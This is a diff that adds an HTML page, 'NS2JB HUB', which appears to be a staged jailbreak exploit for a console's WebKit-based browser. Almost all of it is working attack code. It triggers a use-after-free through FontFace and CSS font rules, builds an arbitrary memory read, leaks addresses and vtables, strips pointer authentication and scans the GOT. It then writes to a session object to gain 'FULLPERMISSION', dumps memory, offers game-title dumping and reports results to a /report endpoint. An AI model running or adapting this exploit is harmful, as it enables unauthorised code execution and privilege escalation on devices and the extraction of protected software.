@@ -1,0 +1,245 @@
+<!doctype html><html><head><meta charset="utf-8"><title>NS2JB HUB</title>
+<style>
+body{margin:0;font-family:ui-monospace,monospace;background:#06080c;color:#cfe3ff}
+header{padding:10px 14px;border-bottom:1px solid #1d2b3a;display:flex;gap:10px;align-items:center}
+h1{font-size:15px;margin:0;letter-spacing:1px;color:#7fd1ff}
+#stat{margin-left:auto;font-size:11px;color:#8aa}
+.wrap{display:grid;grid-template-columns:280px 1fr;height:calc(100vh - 48px)}
+nav{border-right:1px solid #1d2b3a;padding:8px;overflow:auto}
+.stage{border:1px solid #1d2b3a;border-radius:8px;padding:8px;margin-bottom:6px;background:#0b1118}
+.stage b{display:block;font-size:12px;color:#cfe3ff}
+.stage small{display:block;font-size:10px;color:#7a8ea3;margin:2px 0 6px}
+.stage button{width:100%;padding:7px;border-radius:6px;border:1px solid #2f4a63;background:#122131;color:#bfe3ff;font:12px ui-monospace;cursor:pointer}
+.stage button:hover{background:#1a3146}
+.stage.on button{background:#153a24;border-color:#2f7a4a;color:#9ff0b4}
+main{display:flex;flex-direction:column}
+#log{flex:1;overflow:auto;padding:10px;font-size:11px;line-height:1.45;white-space:pre-wrap}
+#log .ok{color:#7ff0a0}.err{color:#ff8a8a}.dim{color:#6b7f94}
+</style></head><body>
+<header><h1>NS2JB · HUB</h1><span id="stat">idle</span></header>
+<div class="wrap">
+<nav id="nav"></nav>
+<main><div id="log"></div></main>
+</div>
+<script>
+var LOG=document.getElementById("log"),STAT=document.getElementById("stat"),NAV=document.getElementById("nav");
+function log(s,cls){var d=document.createElement("div");d.className=cls||"";d.textContent=s;LOG.appendChild(d);LOG.scrollTop=LOG.scrollHeight;}
+function setstat(s){STAT.textContent=s;}
+function report(lines,extra){try{fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify(Object.assign({ua:navigator.userAgent,page:"hub",lines:lines},extra||{}))}).catch(function(){})}catch(e){}}
+// ---- primitive (the proven chain) ----
+var S=0xb8,F=0x28,FZ=0x30,FC=0x34,ST=0x7a,UAF=null;
+function hx(a,b){return "0x"+("00000000"+(b>>>0).toString(16)).slice(-8)+("00000000"+(a>>>0).toString(16)).slice(-8)}
+async function uaf(){
+ var n=0xb0,ab=[],ft=null,fa=null,st=document.createElement("style");
+ var r1="@font-face{font-family:s;src:local(systemfont);unicode-range:U+0043}";
+ var r2="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042}";
+ var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
+ document.fonts.add(A);void A.loaded;document.head.append(st);
+ for(var i=0;i<n/4;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ var u=st.sheet.cssRules.length;st.sheet.insertRule(r2,st.sheet.cssRules.length);
+ for(var i=n/4;i<n;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ void document.body.offsetHeight;
+ var ot=FontFace.prototype.then;
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+  if(this!==A)return;st.sheet.deleteRule(u);void document.body.offsetHeight;
+  for(var i=st.sheet.cssRules.length-1;i>=0;i--){if(st.sheet.cssRules[i].cssText.indexOf("s;")>=0)st.sheet.deleteRule(i)}
+  void document.body.offsetHeight;
+  for(var i=0;i<n;i++){var b=new ArrayBuffer(S),d=new DataView(b);d.setUint32(0x58,0,true);d.setUint32(0x5c,0,true);d.setUint32(8,1,true);d.setUint8(ST,3);ab.push(b)}
+  return undefined}});
+ var fs=null;try{fs=await document.fonts.load("1em a,b","AB")}catch(e){}
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:ot});
+ if(!fs||fs.length!==2)return null;
+ for(var i=0;i<fs.length;i++)if(fs[i].unicodeRange==="U+0-10FFFF")ft=fs[i];
+ for(var i=0;i<ab.length;i++)if(new DataView(ab[i]).getUint32(8,true)===2)fa=ab[i];
+ if(!ft||!fa)return null;
+ var d=new DataView(fa);
+ function sp(o,a,b){d.setUint32(o,a>>>0,true);d.setUint32(o+4,b>>>0,true)}
+ function rd(a,b,sz){var r=new ArrayBuffer(sz),v=new Uint8Array(r),i=0;while(i<sz){sp(F,(a+i)>>>0,b);d.setInt32(FZ,1,true);d.setInt32(FC,1,true);var s=ft.featureSettings;for(var j=1;j<5&&i<sz;j++)v[i++]=s.charCodeAt(j)&255}return r}
+ return {f:ft,rd:rd,ab:fa,dv:d};
+}
+function anchor(){
+ var u=UAF,d=u.dv;
+ var wLo=d.getUint32(0x60,true), wHi=d.getUint32(0x64,true);
+ if(!wLo && !wHi){ log("[2] W=0 (m_wrapper not written yet)",'err'); return null; }
+ if(wHi>0x7f || (wHi===0 && wLo<0x10000)){ log("[2] W implausible "+hx(wLo,wHi),'err'); return null; }
+ var ww=u.rd(wLo,wHi,0x80);
+ var wv=new DataView(ww.buffer||new Uint8Array(ww).buffer);
+ var Fp={lo:wv.getUint32(8,true),hi:wv.getUint32(12,true)};
+ var fw=u.rd(Fp.lo,Fp.hi,0x80); var fv=new DataView(fw.buffer||new Uint8Array(fw).buffer);
+ return {F:Fp,B:{lo:fv.getUint32(0x30,true),hi:fv.getUint32(0x34,true)}};
+}
+// ---- stages ----
+var GAMES=[];
+async function loadGames(){
+  try{ var g=await (await fetch("/games.json",{cache:"no-store"})).json(); GAMES=g.games||[]; }catch(e){ GAMES=[]; }
+  var host=document.getElementById("nav");
+  var box=document.createElement("div");box.className="stage";box.style.borderColor="#2f4a63";
+  box.innerHTML="<b>Games</b><small>select a title (UUID = title id)</small>";
+  var sel=document.createElement("select");sel.style.cssText="width:100%;padding:6px;background:#0b1118;color:#cfe3ff;border:1px solid #2f4a63;border-radius:6px;font:11px ui-monospace";
+  GAMES.forEach(function(g){var o=document.createElement("option");o.value=g.uuid;o.textContent=g.name+"  ["+g.uuid+"]";sel.appendChild(o);});
+  box.appendChild(sel);
+  var b=document.createElement("button");b.textContent="DUMP TITLE";b.style.marginTop="6px";
+  b.onclick=function(){var g=GAMES.find(function(x){return x.uuid===sel.value});if(!g)return;log("[dump] "+g.name+" ["+g.uuid+"]",'ok');report(["[dump-title] "+g.name+" "+g.uuid],{uuid:g.uuid});};
+  box.appendChild(b);
+  host.insertBefore(box, host.firstChild);
+}
+var STATE={uaf:false,leak:false,anchor:false};
+var REQ={uaf:[],leak:["uaf"],probe:["leak"],promote:["uaf","leak"],anchor:["leak"],base:["anchor"],esc:["anchor"],dump:["leak"]};
+var STAGES=[
+ {id:"uaf",name:"1 · UAF + reclaim",desc:"the proven trigger",run:stageUAF},
+ {id:"leak",name:"2 · leak W/F/B",desc:"weak-pointer bootstrap",run:stageLeak},
+ {id:"probe",name:"3 · probe root",desc:"strict chase for fsp-srv",run:stageProbe},
+ {id:"promote",name:"4 · promotion",desc:"m_clients count → root+0x30",run:stagePromote},
+ {id:"anchor",name:"5 · vtable anchor",desc:"leak webkit_wkc base from F",run:stageAnchor},
+ {id:"base",name:"6 · leak openweb base",desc:"read webkit_wkc GOT",run:stageBase},
+ {id:"esc",name:"7 · ESCALATE",desc:"promote session +0x30=1",run:stageEscalate},
+ {id:"dump",name:"8 · dump",desc:"read-only memory dump",run:stageDump}
+];
+function render(){
+ NAV.innerHTML="";
+ STAGES.forEach(function(s){
+  var d=document.createElement("div");d.className="stage";
+  d.innerHTML="<b>"+s.name+"</b><small>"+s.desc+"</small>";
+  var ready=(REQ[s.id]||[]).every(function(r){return STATE[r]});
+  var b=document.createElement("button");
+  b.textContent=(s.id==="promote"?"PROMOTE":s.id.toUpperCase())+(ready?"":"  (locked)");
+  b.disabled=!ready;
+  b.onclick=function(){if(!ready)return;d.classList.add("on");s.run();};
+  d.appendChild(b);NAV.appendChild(d);
+ });
+}
+async function stageUAF(){
+ setstat("uaf");log("UAF…",'dim');
+ UAF=await uaf();
+ STATE.uaf=!!UAF; STATE.uaf=!!UAF; log(UAF?"[1] UAF ok — primitive ready":"[1] UAF FAILED",UAF?"ok":"err"); render(); render();
+ report([UAF?"[1] UAF ok":"[1] UAF failed"]);
+}
+function stageLeak(){
+ if(!UAF)return log("run UAF first",'err');
+ var a=anchor();if(!a){log("[2] leak failed",'err');return;}window.ANCHOR=a;STATE.leak=true;
+ log("[2] F="+hx(a.F.lo,a.F.hi)+" B="+hx(a.B.lo,a.B.hi),'ok');render();
+ report(["[leak] F="+hx(a.F.lo,a.F.hi)+" B="+hx(a.B.lo,a.B.hi)]);
+}
+async function stageProbe(){
+ if(!UAF)return log("run UAF first",'err');
+ var a=window.ANCHOR||anchor();window.ANCHOR=a;
+ var st;try{st=await (await fetch("/probe")).json();}catch(e){return log("no /probe",'err')}
+ var off=st.offset, base={lo:(a.B.lo-off*0x1000)>>>0,hi:a.B.hi};
+ log("[3] probe offset="+off+" @ "+hx(base.lo,base.hi),'dim');
+ var buf;try{buf=UAF.rd(base.lo,base.hi,0x1000)}catch(e){return log("[3] fault",'err')}
+ var bv=new DataView(buf.buffer||new Uint8Array(buf).buffer),n=0;
+ for(var q=0;q+0x40<=0x1000;q+=8){
+  var pl=bv.getUint32(q+0x30,true),ph=bv.getUint32(q+0x34,true);
+  if(ph!==0||pl===0||pl>0xffffff)continue;
+  var a10=bv.getUint32(q+0x10,true),a20=bv.getUint32(q+0x20,true);
+  n++;log("[cand] "+hx((base.lo+q)>>>0,base.hi)+" pid="+pl+" nca="+hx(a10,0)+" save="+hx(a20,0),'dim');
+ }
+ log("[3] cands="+n,"ok");
+ report(["[probe] off="+off+" cands="+n]);
+}
+function stagePromote(){
+ if(!UAF)return log("run UAF first",'err');
+ var a=window.ANCHOR||anchor();
+ var d=UAF.dv;
+ d.setUint32(0x58,(a.B.lo+0x40)>>>0,true); d.setUint32(0x5c,a.B.hi,true);
+ log("[4] m_clients=B+0x40",'dim');
+ try{UAF.f.family="hub-"+Date.now()}catch(e){log("[4] setter: "+e.message,'err')}
+ void document.body.offsetHeight;
+ var bw=UAF.rd(a.B.lo,a.B.hi,0x80);
+ var bv=new DataView(bw.buffer||new Uint8Array(bw).buffer);
+ log("[4] B+0x30="+hx(bv.getUint32(0x30,true),bv.getUint32(0x34,true)),'ok');
+ report(["[promote] B+0x30="+hx(bv.getUint32(0x30,true),bv.getUint32(0x34,true))]);
+}
+async function stageAnchor(){
+  if(!UAF)return log("run UAF first",'err');
+  var a=window.ANCHOR||anchor();
+  var b=UAF.rd(a.F.lo,a.F.hi,8);
+  var v=new DataView(b.buffer||new Uint8Array(b).buffer);
+  var vt={lo:v.getUint32(0,true),hi:v.getUint32(4,true)};
+  log("[anchor] F vtable = "+hx(vt.lo,vt.hi),'ok');
+  // PAC strip: try 40-bit (clear bits 40-63) and 48-bit (clear bits 48-63)
+  var vt40={lo:vt.lo, hi:(vt.hi & 0xffff)};               // 48-bit: keep low 16 bits of hi
+  var vt48={lo:vt.lo, hi:(vt.hi & 0xffff)};               // 48-bit strip
+  log("[anchor] strip40 = "+hx(vt40.lo,vt40.hi),'ok');
+  log("[anchor] strip48 = "+hx(vt48.lo,vt48.hi),'ok');
+  window.VT40=vt40; window.VT48=vt48; STATE.anchor=true; render(); STATE.anchor=true; render();
+  // read the vtable's first slot (a function pointer into wkc3 text) to anchor the base
+  var vt0=UAF.rd(vt48.lo, vt48.hi, 8);
+  var v0=new DataView(vt0.buffer||new Uint8Array(vt0).buffer);
+  var fp={lo:v0.getUint32(0,true),hi:v0.getUint32(4,true)&0xffff};  // 48-bit strip
+  var fpRaw={lo:v0.getUint32(0,true),hi:v0.getUint32(4,true)};      // full raw
+  log("[anchor] vtable[0] = "+hx(fp.lo,fp.hi)+" raw="+hx(fpRaw.lo,fpRaw.hi),'ok');
+  report(["[anchor] vt0raw="+hx(fpRaw.lo,fpRaw.hi)]);
+  window.FP=fp;
+  report(["[anchor] vt0="+hx(fp.lo,fp.hi)]);
+
+  var b2=UAF.rd((a.F.lo+8)>>>0,a.F.hi,16);
+  var v2=new DataView(b2.buffer||new Uint8Array(b2).buffer);
+  log("[anchor] F+0x08="+hx(v2.getUint32(0,true),v2.getUint32(4,true))+" F+0x10="+hx(v2.getUint32(8,true),v2.getUint32(12,true)),'ok');
+  window.VT=vt;
+  report(["[anchor] Fvtable="+hx(vt.lo,vt.hi)]);
+}
+async function stageBase(){
+  if(!UAF)return log("run UAF first",'err');
+  if(!window.VT40){ return log("run stage 5 (vtable anchor) first",'err'); }
+  // scan the GOT around the live vtable (VT40 is a wkc3 data/rodata address)
+  var anchor=window.VT40;
+  var base={lo:(anchor.lo - 0x8000)>>>0, hi:anchor.hi};     // start 32KB below the vtable
+  log("[base] scanning around vtable "+hx(anchor.lo,anchor.hi),'dim');
+  var ext=[];
+  for(var k=0;k<0x10;k++){
+    var a={lo:(base.lo+k*0x1000)>>>0,hi:base.hi};
+    var buf;try{buf=UAF.rd(a.lo,a.hi,0x1000);}catch(e){break;}
+    var bv=new DataView(buf.buffer||new Uint8Array(buf).buffer);
+    for(var q=0;q+8<=0x1000;q+=8){
+      var lo=bv.getUint32(q,true),hi=bv.getUint32(q+4,true);
+      if(hi>=0x50 && hi<=0x9f){ ext.push(hx(lo,hi)); }
+    }
+  }
+  log("[base] 0x70… pointers: "+(ext.length?ext.join(" "):"none"),'ok');
+  report(["[base] "+ext.join(" ")]);
+}
+async function stageEscalate(){
+  if(!UAF)return log("run UAF first",'err');
+  var d=UAF.dv;
+  function rd64(lo,hi){var b=UAF.rd(lo,hi,8);var v=new DataView(b.buffer||new Uint8Array(b).buffer);return {lo:v.getUint32(0,true),hi:v.getUint32(4,true)};}
+  var ob=null;
+  if(!window.VT40){return log("run stage 5 first",'err');}
+  var anchor=window.VT40; var base={lo:(anchor.lo&~0xFFFF)>>>0,hi:anchor.hi};
+  for(var k=0;k<0x10&&!ob;k++){
+    var a={lo:(base.lo+k*0x1000)>>>0,hi:base.hi};
+    var buf;try{buf=UAF.rd(a.lo,a.hi,0x1000);}catch(e){break;}
+    var bv=new DataView(buf.buffer||new Uint8Array(buf).buffer);
+    for(var q=0;q+8<=0x1000;q+=8){
+      var lo=bv.getUint32(q,true),hi=bv.getUint32(q+4,true);
+      if(hi>=0x50 && hi<=0x9f){ if(!ob || hi<ob.hi || (hi===ob.hi && lo<ob.lo)) ob={lo:lo,hi:hi}; }
+    }
+  }
+  if(!ob){log("[esc] no 0x70 pointer",'err');return;}
+  log("[esc] openweb_base = "+hx(ob.lo,ob.hi),'ok');
+  var sp=rd64((ob.lo+0xcabb30)>>>0,ob.hi);
+  log("[esc] session obj = "+hx(sp.lo,sp.hi));
+  if(!sp.lo&&!sp.hi){log("[esc] session null",'err');return;}
+  var tgt={lo:(sp.lo+0x40)>>>0,hi:sp.hi};
+  d.setUint32(0x58,tgt.lo,true);d.setUint32(0x5c,tgt.hi,true);
+  try{UAF.f.family="esc-"+Date.now();}catch(e){log("[esc] trigger: "+e.message,'err');}
+  void document.body.offsetHeight;
+  var v30=rd64((sp.lo+0x30)>>>0,sp.hi);
+  log("[esc] session+0x30 = "+hx(v30.lo,v30.hi)+(v30.lo===1?"  <-- FULLPERMISSION":""));
+  report(["[esc] openweb="+hx(ob.lo,ob.hi)+" session="+hx(sp.lo,sp.hi)+" +0x30="+hx(v30.lo,v30.hi)]);
+}
+function stageDump(){
+ if(!UAF)return log("run UAF first",'err');
+ var a=window.ANCHOR||anchor();
+ var bw=UAF.rd(a.B.lo,a.B.hi,0x200);
+ var bv=new DataView(bw.buffer||new Uint8Array(bw).buffer),s="";
+ for(var i=0;i<0x200;i+=16){var r="";for(var j=0;j<16;j++)r+=("0"+bv.getUint8(i+j).toString(16)).slice(-2)+" ";s+=hx(a.B.lo+i,a.B.hi)+"  "+r+"\n";}
+ log("[5] dump B 0x200:\n"+s,'dim');report(["[dump]\n"+s]);
+}
+render();
+loadGames();
+log("hub ready — stages on the left, log here",'dim');
+log("this is the permanent UI; no more separate pages",'dim');
+report(["hub loaded"]);
+
+</script></body></html>
